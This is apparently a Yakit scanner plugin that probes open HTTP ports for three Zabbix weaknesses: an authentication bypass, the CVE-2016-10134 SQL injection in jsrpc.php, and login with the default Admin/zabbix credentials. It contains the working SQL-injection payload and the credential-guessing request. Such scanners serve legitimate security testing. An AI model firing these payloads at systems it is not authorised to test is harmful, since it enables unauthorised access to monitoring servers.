# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 

PacketGet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`
PacketPost = `POST /index.php HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

name=Admin&password=zabbix&autologin=1&enter=Sign+in
`


//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}

//填充对应的漏洞检测规则

// 41557 43952
num = fuzz.Strings(`{{ri(200000,210000,1)}}`)[0]
addRule(PacketGet,`/zabbix.php?action=dashboard.view&dashboardid=1`,func(rsp,header,body){
    if rsp.StatusCode == 200  && str.MatchAllOfSubString(body, `<a class="top-nav-zbbshare" target="_blank" title="Zabbix Share" href="https://share.zabbix.com/">Share</a>`,`<title>Dashboard</title>`){
        return true
    }
    return false
},"认证绕过",`zabbix-authentication-bypass`,"high","https://www.exploit-db.com/exploits/47467")



addRule(PacketGet,`/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,md5(`+num+`)),0)`,func(rsp,header,body){
    if rsp.StatusCode == 200  && str.MatchAllOfSubString(body, codec.Md5(num)){
        return true
    }
    return false
},"sql注入",`zabbix-cve-2016-10134-sqli`,"high","https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134")


addRule(PacketPost,`/`,func(rsp,header,body){
    if rsp.StatusCode == 302 && str.MatchAllOfSubString(header, `location`,`zabbix.php?action=dashboard.view`,`set-cookie`,`zbx_session`) {
        return true
    }
    return false
},"弱口令",`zabbix-default-password`,"high","https://www.zabbix.com/documentation/3.4/zh/manual/quickstart/login")

//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}


handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }

    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
 
    //漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
